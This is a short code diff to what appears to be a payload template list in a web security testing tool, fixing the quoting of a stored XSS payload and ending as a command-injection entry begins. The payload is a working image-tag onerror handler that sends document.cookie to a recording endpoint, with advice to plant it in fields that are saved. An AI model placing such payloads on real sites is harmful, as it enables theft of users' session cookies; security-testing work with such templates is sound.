@@ -23,7 +23,8 @@ const payloadTemplates = {
   },
   "xss-stored": {
     name: "Stored XSS (stored payload)",
-    template: `<img src=x onerror='fetch(`/api/record?ev=xss&cookie=`+document.cookie)'>`,
+    // Changed: Backticks inside the template string replaced with single quotes.
+    template: `<img src=x onerror="fetch('/api/record?ev=xss&cookie=' + document.cookie)">`,
     description: "Attempts to store XSS in DB for later execution. Place in comment/feedback/fields that save."
   },
   "command-injection": {
